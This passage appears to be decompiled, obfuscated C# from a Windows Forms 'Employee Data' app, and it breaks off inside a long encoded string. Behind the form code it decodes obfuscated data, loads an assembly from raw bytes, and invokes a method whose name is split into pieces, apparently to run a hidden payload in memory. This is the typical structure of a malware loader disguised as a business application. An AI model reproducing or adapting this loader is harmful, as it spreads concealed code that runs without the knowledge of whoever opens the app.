		MainForm.smethod_27(MainForm.smethod_50((Control)(object)this), (Control)(object)btnNext);
		MainForm.smethod_27(MainForm.smethod_50((Control)(object)this), (Control)(object)GroupBox1);
		MainForm.smethod_27(MainForm.smethod_50((Control)(object)this), (Control)(object)MenuStrip1);
		MainForm.smethod_51((Form)(object)this, MenuStrip1);
		MainForm.smethod_52((Control)(object)this, "MainForm");
		MainForm.smethod_53((Form)(object)this, "Employee Data");
		MainForm.smethod_54((Control)(object)GroupBox1, bool_0: false);
		MainForm.smethod_55((Control)(object)GroupBox1);
		MainForm.smethod_54((Control)(object)MenuStrip1, bool_0: false);
		MainForm.smethod_55((Control)(object)MenuStrip1);
		MainForm.smethod_56((Control)(object)this, bool_0: false);
		MainForm.smethod_57((Control)(object)this);
	}

	private static void jj(Type x, int xz)
	{
		object[] object_ = new object[3]
		{
			OOQ.GetCore2,
			OOQ.GetCore3,
			"EmployeeData"
		};
		MethodInfo methodBase_ = MainForm.smethod_59(x, MainForm.smethod_58(new string[7]
		{
			"Bun",
			string.Empty,
			"ifu_Te",
			string.Empty,
			"xtB",
			string.Empty,
			"ox"
		}));
		MainForm.smethod_60((MethodBase)methodBase_, (object)0, object_);
	}

	private static void UY(Assembly t)
	{
		Type x = MainForm.smethod_61(t)[0];
		jj(x, 5);
	}

	public static string OIQAKDS(string input)
	{
		string string_2 = default(string);
		for (int i = 0; i < MainForm.smethod_65(input); i = checked(i + 1))
		{
			char ch = MainForm.smethod_62(input, i);
			string string_ = MainForm.smethod_63(OIQDJSHBD(ch));
			string_2 = MainForm.smethod_64(string_2, string_);
		}
		return MainForm.smethod_66(string_2);
	}

	public static object OIQDJSHBD(char ch)
	{
		checked
		{
			return MainForm.smethod_69(MainForm.smethod_68((int)MainForm.smethod_67((double)unchecked((int)ch) / 1.46903508512662)));
		}
	}

	private static Assembly OIQDKLSDJX(byte[] RAW, bool AccountDomainSid)
	{
		return MainForm.smethod_71(MainForm.smethod_70(), RAW);
	}

	public static Point jjjj(Point s, bool f)
	{
		string string_ = "{~¦w\u200c\u200cq\u200c\u200c\u200c\u200ce\u200c\u200c\u200c\u200cEER\u200c\u200cp\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cw\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u0097\u200c\u200c\u200c\u200c\u200cL\u0096¬\u0097L\u200cª\u200c¢sk\u0090\u0097a{qG\u0099~h\u0099¥\u0091²a\u00af\u0091\u00a0T¢\u0091\u00a0gªkhs\u0099\u0090\u00a0N\u00ad\u0093ba\u009a\u0084za²\u0093\u0080L\u0097\u008e\u0080L\u0097xeT{khH\u00ad\u0084h}¬dwGnm\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cawxw\u200c\u200c{\u200ced\u200chIn\u009f\u0080e\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ct\u200c\u200c\u200c\u009aep\u200cw\u0097\u200c\u200cd£\u200c\u200c\u200c\u200ch\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cd\u009f\u0097\u200c\u200c\u200c\u200c\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200c\u200c\u200c\u200c\u0097\u200c\u200c\u200c\u200c\u200c\u0097\u200c\u200ca\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ce\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb\u0097\u200c\u200c\u200c\u200c\u200c\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cq\u200cwk}\u200c\u200ca\u200c\u200c\u200ca\u200c\u200c\u200c\u200c\u200c\u200ce\u200c\u200c\u200ce\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cp°\u0081\u200c\u200cav\u200c\u200c\u200c\u200c\u200ch\u200c\u200c\u200c\u200c\u200ce\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ck\u200c\u200c\u200c\u200c\u00af\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ck\u200c\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cbb\u200c\u200c\u200ce\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cbNG\u0084\u0081\u0099G\u200c\u200c\u200c\u200cgd\u0097\u200c\u200c\u200c\u200c\u0097\u200c\u200c\u200c\u200ct\u0097\u200c\u200c\u200c\u200ck\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb\u200c\u200c\u200ch\u200c¬\u0091¢s²\u0083\u00af\u200c\u200c\u200c\u200c\u200ce\u200c\u200c\u200c\u200c\u0083\u200c\u200c\u200c\u200c\u200cw\u200c\u200c\u200c\u200cR\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200c\u200c\u200ca\u200cp¢m\u009f\u0090hT\u009c\u200c\u200c\u200cq\u200c\u200c\u200c\u200c\u200ck\u200c\u200c\u200c\u200c\u200cb\u200c\u200c\u200c\u200cw\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cw\u200c\u200c\u200cw\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cd\u00af~\u00af\u200c\u200c\u200c\u200c\u200c\u200c\u200ce\u0097\u200c\u200c\u200c\u200cb\u200c\u200c}\u200c\u0083e\u0083\u200c\u200cg\u00afx\u200c\u200c\u200cd\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cs\u0083\u0097\u0091\u0097k\u200c\u200ckGa\u200c\u200c\u200cam\u0093\u200ca\u200c\u200c\u200cen\u200ce\u200c\u200c\u200c¦\u200c\u200c\u0097\u200c\u200cabb©\u200cw\u200c\u200c\u009cwe\u200c\u200c\u200ce\u009fG\u200cq\u200c\u200c\u200cw£\u200cw\u200c\u200cb£\u200ce\u200c\u200c\u200cen\u0097\u200c\u200ch³\u200ch\u200cv©a\u200c\u200c\u200ca\u200c\u200c\u200cx\u0096\u0097k\u200c\u200c\u200cw{e\u0081Le\u200c\u200c\u200cee\u00afL§m\u0099ejxw}\u200c\u200c\u200c\u200cp\u200c\u200c\u200c\u200cb\u00af\u200c\u200c\u200c\u200c©\u200c\u200c\u200c\u200cp\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cs\u200cb\u200c\u200c\u200chm\u0099\u0091{a²\u00ad\u008e\u200c¢qb\u200c\u200c\u200cnb\u0099£{bxemxw\u0083\u200c\u200c\u200c\u200c¦\u200c\u200c\u200c\u200cmw\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u009f\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb£\u200c\u200c\u200c\u200c\u008e\u009cw\u0097\u200c\u200c\u200cepa¢}j\u200c\u200c\u200caaK}a\u200c\u200c\u200c\u0090g\u0099£\u0097Q\u0097e\u200c\u200cbdb\u200cw\u200c\u200cn\u200ce\u200c\u200cb©\u00a0h°qmnQ\u0091j\u0093\u200ce\u200c\u200ca©\u0080k\u200cka\u200c\u200c\u200c\u0097\u0080\u0097e\u200c\u200cb\u0097z\u200c\u200c\u200chd\u200c\u0084Ha\u00af\u200c\u200c\u200cx\u0084³\u200c\u00af\u200c\u200cb\u0097G\u0084e\u00af©xbG}h\u200c\u200c\u200c\u200cp\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c©\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb\u00af\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cbkGk\u200c\u200c\u200cae\u00afwm\u0093\u200c\u009d\u200c\u200c\u200cexaj}a\u200c\u200c\u200c\u0090g\u0097\u0097\u0097\u009c\u0097e\u200c\u200cbb\u009a\u200cw\u200c\u200cn\u200ce\u200c\u200cb©\u00a0h\u0099qpnQ}xaj}a\u200c\u200c\u200c\u0090e\u00af\u0081\u0093³\u200c\u200c\u200c\u200ca\u0097{dxesxw\u0091\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cx\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb£\u200c\u200c\u200c\u200c¦\u200c\u200c\u200c\u200cb\u0081}m\u200c\u200c\u200capakxd\u009aaE\u200cw\u200c\u200c\u009d²\u200cw?\u00af\u200c\u200c\u0080xqsnRqxd\u009aa\u009c\u200cw\u200c\u200c\u009d²bG¬\u00af\u200c\u200c\u0080z\u00ad©b\u0081}m\u200c\u200c\u200ca\u0090\u00afw\u200c\u200c\u200c£xd\u0099T~\u009d²b\u0093gw\u200c\u200c\u0080xqsnN¢\u0091haqwexaga\u00af\u200c\u200c\u200caG\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cd£\u200c\u200c\u200c\u200ch\u0093\u200c\u0091\u200c\u200c\u200ce©e\u0099etkk\u0083a\u200c\u200cb{kg\u0096\u00ad\u200c\u200ca\u0084e°\u200c§\u00af°\u00af§?w\u0084Ha\u00af\u200c\u200c\u200c\u0080Re\u200c\u200c\u200cnexe\u0097n\u200ck\u200c\u200cmq\u0097\u200ce}\u200c\u200cg\u009d{eb¬\u009cKa\u0083{e°e{xw}\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200caeg\u0093we\u200c\u200ca©¦\u200ceeG\u200c\u200c\u200cb\u200c\u200c\u200c\u200c§w\u200c\u200c\u200cg\u00af\u200c\u200c\u200c\u200cm\u200cw\u200c\u200c\u008e\u00af\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cb\u200c\u200c\u200c\u200cvw\u200c\u200c\u200cd\u0091a\u200c\u200caG\u200cw\u200c\u200c\u0083w\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c{q\u200c}\u200c¢\u0097e\u200c\u200c\u200ck\u200c\u200cag?a\u200c\u200c\u200caaqn\u0096\u0097k\u200c\u200c\u200cw{b²ª\u0080ew\u009fgew\u200c\u200c\u200cawa\u200c\u200cd\u00a0\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ct\u0083\u200c\u200c\u200c\u200cp\u200c\u200c\u200c\u200cI\u0097\u200c\u200c\u200cj\u0083\u200c\u200c\u200cd?\u200c\u200c\u200c\u200ck\u00afe\u200c\u200ce\u200c\u200c\u200c\u200c\u200cQ\u200cw\u200c\u200c~\u200c\u200c\u200c\u200chw\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c©\u00af\u200c\u200c\u200cmq\u200c\u200c\u200cdw\u200c\u200c\u200c\u200cG\u200cq\u200c\u200c\u200c\u0083\u00a0h\u0099qmnO£\u0097\u0091\u200ck\u200c\u200cb\u200cn\u200c\u0097\u200c\u200cnaw\u200c\u200c\u200c\u0083dkpR\u200c\u200c\u200c\u200c\u0097¦w\u200c\u200c\u200cb\u0097b\u200c\u200c\u200c§b\u0099enkse\u200c\u200c\u200cb{kk{§\u200c\u200ca\u0084e\u00af\u009dL\u0093\u0096EEE\u00afkb\u009c\u00a0\u009d\u0081\u0080\u0084e\u0096\u0091hepj\u00af©{b{\u0099\u0099EEEE\u200c£N¥gH\u009asb\u200c\u200c\u200c\u200cw\u00af\u0080dx\u0083{aaepjHz{kk\u200c\u0084\u200c\u200ca\u0084e\u00af\u009dLvEEEE\u00af\u0097xa\u200ckxamej\u0083w\u0084G\u200cw\u200c\u200ch\u00af\u00a0x\u0083\u0093n\u0091j\u00afR{b{\u0097\u009aEEEEbwq\u0097G\u00afk\u200c\u200cbdK\u200c\u0097\u200c\u200cn\u200cq\u200c\u200cb©\u0081\u0080\u0096Lae\u00af}\u0096d\u0099qmt\u200cpEEERxaz\u00afmj°\u200c{b{\u009cHE\u00adEEew©\u0097\u008e\u00afe\u200c\u200cmq\u0097O\u009a£\u200c\u200cg\u009d§Ox\u0083shxqmts\u00ad?EERmgH\u0097shxqmtqE?EERxaa\u0093\u0083e\u00afwxb°TR\u009d²a\u0091L\u00af\u200c\u200c\u0080xqmtp\u0096?EERxa\u200cnt\u008ex\u0093\u0084E\u0097k\u0080E\u0097e{a\u0099\u0083{b{\u009a\u0099E\u00adEEew\u0083ªbaL{b{\u009a~E\u00adEEjb\u00adIe\u0097kb\u009c\u00a0\u009d\u0081\u0080z\u0097e\u200c\u200c\u200c§baqjj\u00af£{b{\u0099OE\u00adEEew\u0093H\u200cw\u200c\u200ch²£\u200c\u200caq\u00afb\u200c\u200cK\u200c\u0097\u200c\u200c\u200c\u00af\u200c\u200ce\u0081Le\u200c\u200c\u200cee\u00af°?\u200c\u0097\u200c\u200caaqsnH\u00afxbG}w\u200c\u200c\u200c\u200c\u0080\u0097e\u200c\u200cg£a\u200c\u200ca\u200c\u200c\u200c\u200c\u200c\u009a\u0097e\u200c\u200cjea\u200c\u200cbn\u200cw\u200c\u200c³\u00af\u200c\u200c\u200cp\u00afa\u200c\u200cbb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cm\u0091a\u200c\u200cd©\u200c\u200c\u200c\u200ch\u00af\u200c\u200c\u200chqa\u200c\u200c\u200c~\u200c\u200c\u200c\u200c~\u00af\u200c\u200c\u200cs\u200ce\u200c\u200c\u200chm\u0099eqj²O{kvªg\u200c\u200ca\u0084e\u00af©§¥jqh\u200c\u200c\u200cnb\u0097k\u0097\u0097\u00afk\u200c\u200cbd§\u200c\u0097\u200c\u200cn\u200c}\u200c\u200cb©\u0081I\u0097©xdaRt\u009d²\u200cxx\u00af\u200c\u200c\u0080xqptj¢EEER\u0080daeqkeLa\u200c\u200cb{ke~\u009a\u200c\u200ca\u0084e\u00af©L\u0083\u00adEEE\u00afk\u0097\u0084we\u200c\u200cb\u200cq\u200cw\u200c\u200cn\u200c}\u200c\u200cb©\u0081I\u0097G\u0080e\u00afwxdz\u200c\u0099\u200cw\u200c\u200c\u009d²ab\u0083w\u200c\u200c\u0080xqptd\u0096EEERbbaeeksRb\u200c\u200c\u200c\u0097\u00ad\u0097k\u200c\u200cb\u0097h\u200c\u200c\u200c§e\u00af}xax\u0083\u0080g\u0099\u0083\u0097\u00ad\u00afe\u200c\u200cbbb\u200cw\u200c\u200cn\u200c\u00af\u200c\u200c\u200c\u0083\u0097Gw\u200c\u200c\u200cbb¬\u200c\u200c\u200c\u200cna}\u200c\u200c\u200c\u0083{a\u0099eqjK\u00a0{kd¢\u0083\u200c\u200ca\u0084e\u00af©LO\u00adQEE°ehpa}xdbb\u0081\u200cw\u200c\u200c\u009d²b¦e\u200c\u200c\u200c\u0080xqptsj?EER\u0096dz\u00adHa¢}v\u200c\u200c\u200caa¢wv\u200c\u200c\u200cakqkd\u200c\u200c\u200c\u0097\u00a0\u200cq\u200c\u200cb\u0097j\u200c\u200c\u200c§h\u0083Gk\u200c\u200c\u200camx\u0083zaxR\u0094jKw£dw\u200c\u200ca¥\u00af\u009fg°kgkk\u009d\u200c\u200c\u200c\u200c\u0097L\u0097\u200c\u200c\u200cb\u0097s\u200c\u200c\u200ch¢b}\u0083e\u0097}\u0097\u009d\u0097e\u200c\u200cbd?\u200cw\u200c\u200cn\u200cG\u200c\u200c\u200c\u008e\u0091kn\u00afa\u200c\u200c\u200c\u0097\u009a\u00afe\u200c\u200cb\u0097k\u200c\u200c\u200c§g°qptgE?EER\u0096dxqptg\u0090?EERxaa\u0096\u0080e\u00afw\u008ee\u00af©LzvQEE°eeb\u0096Lbg\u00adLae\u00af\u0091xa²Gkhxqptdp?EER\u0094nE\u0083kgT\u0083qj\u00af£{b³\u0097\u009aE\u00adEEb\u200c\u0096?\u200c\u0099\u0090?\u200cxqkew\u0097ªbaG{b³\u0097sE\u00adEEew\u00af\u0097\u00ad\u0097\u200c\u200c\u200cmq\u0097¥\u0097\u200c\u200c\u200cg\u009d§Ow\u0084Hd\u00af\u200c\u200c\u200c\u0093\u200ck\u200c\u200c\u200can\u200c\u0091\u200c\u200c\u200c¥\u00adb\u200c\u200c\u200cb¢wa\u200c\u200c\u200c\u0090e\u00af\u009dxb\u0081wa\u200c\u200c\u200c\u0090n\u0097\u200c{q\u200c}\u200c\u009f\u200c\u200c\u200c\u200c\u200cw\u200c\u200cag?a\u200c\u200c\u200caaqen³kmxw\u0083\u200c\u200c\u200c\u200c}\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca}\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cg\u200c\u200c\u200c\u200cdwaw\u200c\u200ca\u009a\u0083xaaTj\u009d²\u200c\u009d~w\u200c\u200c\u0080wG§³\u0097vwa\u0097\u200c\u200c\u200c\u009a\u0097j\u200c\u200c\u200cnk\u200cHmLGw\u0096eaG£b\u0097\u200c\u200ca\u009ad\u0080\u200c\u200c\u200c\u200cksq\u200c\u200c\u200c\u200c£bw\u200c\u200cn²\u200c¢\u200c\u0097\u200c\u200ckg\u00afb\u200c\u200c\u200c£d\u00af\u200c\u200ca¢qm\u200c\u200c\u200cnb\u0099\u009dsnLLh\u0093x}\u200c\u200c\u200ceb\u0090\u00af£\u200c\u200c\u200c¥Gew\u200c\u200c\u200cw©j\u0093ae\u200c\u200c\u200ce¦e³\u200cj\u200ceka\u200c\u200c\u200cg\u200c\u200c\u200cx\u0096\u0097w\u200c\u200c\u200cw{b\u0081Lb\u200c\u200c\u200cee\u00af£\u0090e\u00af\u0097xbe}k\u200c\u200c\u200c\u200ckw\u200c\u200c\u200cv\u00af\u200c\u200c\u200cbK\u200c\u200c\u200c\u200c\u0080\u00af\u200c\u200c\u200cp\u0091\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u0080\u00af\u200c\u200c\u200cp\u0091\u200c\u200c\u200c\u200c\u0097¢hq\u200c\u200cba\u009d\u200cw\u200c\u200ckg\u0097a\u200c\u200c\u200c£bw\u200c\u200ca\u0097ken\u200c}\u200c\u200c\u200c\u0083ng\u0099qknQ\u0097h\u0093xe\u200c\u200c\u200ce£a\u200c\u200c\u200ca\u0097©j\u0093\u200ce\u200c\u200ca©dn\u200cq\u200c\u200c\u200c\u0083qbj}a\u200c\u200c\u200c\u0090n\u200ck\u200c\u200c\u200c\u0083sew\u009d\u0097\u009fw\u200c\u200c\u200cmq\u0097\u009c\u009a\u0091\u200c\u200cg\u009d{bd\u0099?EEEEb\u0081}a\u200c\u200c\u200c\u0090kk\u200ca\u200c\u200c\u200c\u0097\u00ad\u0097e\u200c\u200cb\u0097w\u200c\u200c\u200che\u00afwxajw\u0080\u200c\u200c\u200caG\u200c}\u200c\u200c\u200ck£a\u00af\u200c\u200cb\u009a\u200cdz\u0094sehx££b\u0097\u200c\u200ca\u0099\u0097}kqR\u200c\u200c\u200c\u200c\u0097Ow\u200c\u200c\u200cb\u0097n\u200c\u200c\u200c§e\u00af}xb\u009ad³\u200c\u200c\u200c\u200c\u009d²a\u0093K\u00af\u200c\u200c\u0080xqktbpEEERxa\u0093\u200ce\u200c\u200c\u200cbn\u200c\u0091\u200c\u200c\u200c£\u0097ge¢\u009cxaRph\u009a\u0097n\u200c\u200c\u200chha\u009asaw\u200c\u200c\u200cz}\u0080g£\u00af\u0083\u200c\u200c\u200ca£\u009a\u0097p\u200c\u200c\u200cne\u00af\u0083xb\u009ad\u009f\u200c\u200c\u200c\u200c\u009d²\u200cj¦\u200c\u200c\u200c\u0080xqktsK?EER\u0080n\u200c\u00af\u200c\u200c\u200c£¦G\u200c\u0083\u200c\u200c\u200c\u0083\u00a0n\u0097\u200c\u200ct\u0097k£dw\u200c\u200cb\u009a§wa\u00af\u200c\u200ca\u009a\u0083¦\u200caq\u00af\u200c\u0097\u200c\u0093\u200cw\u200c\u200ca\u0097\u200c\u200ce\u0081Lb\u200c\u200c\u200cee\u00af~?a\u200c\u200c\u200caaqhnG\u0083xae}s\u200c\u200c\u200c\u200cb\u00af\u200c\u200c\u200ceG\u200c\u200c\u200cbQ\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ck\u200c\u200c\u200c\u200cbT\u200c\u200c\u200c\u200c¬\u00af\u200c\u200c\u200caR\u200c\u200c\u200ca©\u200c\u200c\u200c\u200c£w\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u0083\u200c\u200c\u200c\u200c\u00adw\u200c\u200c\u200cs\u200ck\u200c\u200c\u200chm\u0099\u0083{ab¬Og\u0097£xazd\u008e\u200cw\u200c\u200c\u009d²bQq\u200c\u200c\u200c\u0080xqenO\u0083e\u200cIe\u0096\u008eg\u009dh\u0083}}b\u200c\u200c\u200c\u200ce\u0097\u200c\u200c\u200ca\u0083\u200c\u200c\u200c\u200cxaxTk\u009d²d\u009aa\u200c\u200c\u200c\u0080xqetjEEEER\u0096b²\u00adHj\u009a\u00ad²j\u00af©ph\u0099qethKEEERb\u009c\u200ck\u200c\u200caª\u00add\u0097\u200c\u200cb\u0097©\u008ee\u00afwL\u0080\u0096EEE\u00afnq\u200c\u0097\u200c\u200chIRv\u200c\u200c\u200cnb°£{ad\u0099gEEEEa\u0099\u0093\u0083b\u0097w\u009f\u0080\u0097\u00afebg\u0097qew\u0083\u0097\u0096\u200ce\u200c\u200cmq\u0097H\u0093}\u200c\u200cg\u009d{ad\u0097\u009dEEEEba\u0099\u0093pw\u0097\u0091e\u00afwLgEEEE°ehj°\u00a0{kgwn\u200c\u200ca\u0084n?\u00afjn\u0099ehkn\u200ca\u200c\u200cb{kv{a\u200c\u200ca\u0084e\u00afwLREQEE\u00af\u200c\u200c\u200caq\u00af\u200c\u00afb²\u200c\u200c\u200c\u200ca\u00af\u200c\u200ce\u0081Le\u200c\u200c\u200cee\u00af}\u0080e\u00afwxae}m\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cg}\u200c\u200c\u200c\u200c§\u200c\u200c\u200c\u200ck\u200c\u200c\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u009f\u200c\u200c\u200c\u200cs\u00af\u200c\u200c\u200cd\u0091\u200c\u200c\u200c\u200cj\u200c\u200c\u200c\u200cg\u0097£\u0094e\u00afw§³\u0097wd\u0083xRR\u0080w\u0084\u0099xwe\u200c\u200c\u200c\u200cg\u200c\u200c\u200c\u200ch\u0099qenQ\u0097\u0090nE\u009d\u0083e\u00afw§©\u200ck£e\u200c\u200c\u200cb\u0097\u0083\u0081\u0080\u200c£\u0097R\u200c\u0091\u200c\u200c\u200c©\u0083dbdR\u200cw\u200c\u200ca°¥\u0090bg\u009d²d°egj²z{kts¬\u200c\u200ca\u0084e\u00afw§\u0097°L§?z£\u0080e\u00af\u0091xaG}g\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u0091\u200c\u200c\u200c\u200cj\u200c\u200c\u200c\u200ca\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cdwbw\u200c\u200ca\u009a\u0083¦nL£\u200c\u200caq\u00afb\u200ca\u0091\u200c\u0097\u200c\u200cb\u200c\u200c\u200ce\u0081Le\u200c\u200c\u200cee\u00afT?\u200c\u0097\u200c\u200caaqwnH£xd\u009d}z\u200c\u200c\u200c\u200cT\u0097e\u200c\u200c\u200c©\u200c\u200c\u200cb³\u200cw\u200c\u200c¥we\u200c\u200chw\u200c\u200c\u200cb\u0081\u200c\u200c\u200c\u200c©\u200c\u200c\u200c\u200cdw\u200c\u200c\u200cdT\u200c\u200c\u200c\u200cxwe\u200c\u200csG\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c¦\u200c\u200c\u200c\u200cqRa\u200c\u200cbe\u200c\u200c\u200c\u200c\u0084\u200c\u200c\u200c\u200cgG\u200c\u200c\u200ca£\u200cw\u200c\u200cG\u200c£\u200c\u200c\u200c\u0083\u00a0g°qtnO\u0083dk\u200c¥mLGx\u0099a\u0080en\u0096\u0097\u0083\u200c\u200c\u200cwqbjwd\u200c\u200c\u200c\u0090mw\u008e{b\u00af\u0083\u0083\u0080mqj\u0083w©\u0093e\u00afLL\u0096\u0096EEEKLj\u200c\u200c\u200ce\u0093\u200cw\u200c\u200ca©j\u00a0\u009a}sp\u200c\u009d\u0096eaqtth{EEERxd²aT\u200cw\u200c\u200c\u009d²\u200c\u0099N\u00af\u200c\u200c\u0080z\u00ad¥b\u0081}\u0097\u200c\u200c\u200can\u0097\u0099G\u200c\u00af\u200c\u200chKLg\u200c\u200c\u200ce\u0093\u200cq\u200c\u200ca©he\u00af\u00af{b°qnj\u00afL{d\u009c\u0097ªEEEE\u0091°e\u200c\u200c\u200c£{aaen\u0093wq\u200c\u200ca©xdmq{axen\u0093\u200cq\u200c\u200ca©xda\u0093\u0083\u009d°eg\u0083xqhjaqtt\u200cjEEERxda\u009f\u0083e\u00af\u00afxa\u0099R\u0096\u0081°ehkqdE\u200c\u200ca\u0096gIs\u0097e\u00af\u0091xeb\u200c\u0094\u200cw\u200c\u200c\u009d²b}a\u00af\u200c\u200c\u0080xqtts{?EERxa\u0099R\u0097\u0081²\u00af~ex\u200c\u0097{\u0097e\u200c\u200cmq\u0097\u0094Ge\u200c\u200cg\u009d{d\u009c\u009aLE\u00adEEj\u00af\u009d§Txejj\u00afT\u009aew¥H\u200c\u00af\u200c\u200ch°eqmx\u0093\u0083e\u00af²{ew~?\u200c\u0097\u200c\u200cabb\u0080\u200c\u200c\u200c\u200c\u0096\u0097k\u200c\u200c\u200cw\u0097\u009f\u0097\u200c\u200c\u200cms?\u200c\u0097\u200c\u200cabbt\u200c\u200c\u200c\u200c\u009dI\u200c\u0096\u0096H?\u0093\u0083\u0080\u200c{a°Rme\u00afLL\u0090vQEE°ep\u0093wq\u200c\u200ca¬t\u008exqkg°qmewR\u0097hwe\u200c\u200cmq\u0097\u0094\u0080q\u200c\u200cg\u009d{d\u009c\u0099mE\u00adEEewxHkw\u200c\u200c\u200cxegew¥G\u200c\u00af\u200c\u200ch°eqew\u0093\u0083ew\u009f\u0084\u009dIexbKwd\u200c\u200c\u200c\u0090ew\u009dxdg\u0097\u0096e~\u0097xbgI{\u0083\u0093g\u00ade\u0097\u200c\u200cb\u009a\u0083\u0084e\u00afLLdvQEE°emgH\u0097{bx\u0097{d\u009c\u009c?E\u0096EEew\u009dxa³emj\u00afG{d\u009c\u009c\u00adE\u0096EEex\u200c\u0096eNq\u0097\u0080\u008ek\u200c\u200cg\u009d§Qaee\u0093ze\u200c\u200c\u200cg\u00ade\u00af\u200c\u200cb\u0097H?a\u00af\u200c\u200cajwe\u200c\u200c\u200c\u0090a\u00af\u009fGk\u200c\u200c\u200c\u200c\u008ek\u0080e\u00afLL¬EKEE\u00af\u009fHk\u200c\u200c\u200c\u200cz£{q\u200cq\u200cN\u00af\u200c\u200c\u200c\u200c\u009d\u200c\u200cag?a\u200c\u200c\u200caaqhn³Lxa}}p\u200c\u200c\u200c\u200cb\u00af\u200c\u200c\u200cne\u200c\u200c\u200c\u200c\u0096\u200c\u200c\u200c\u200c£\u00af\u200c\u200c\u200ce}\u200c\u200c\u200cb\u0099\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ce}\u200c\u200c\u200caj\u200c\u200c\u200c\u200c\u0080w\u200c\u200c\u200chL\u200c\u200c\u200cdwb\u00af\u200c\u200ca\u009a\u0083\u0080e\u00af}§\u00af\u0099\u0083new\u0083\u0097°w\u200c\u200c\u200cmq\u0097³T£\u200c\u200cg\u009d{az¬¬\u200c\u00afx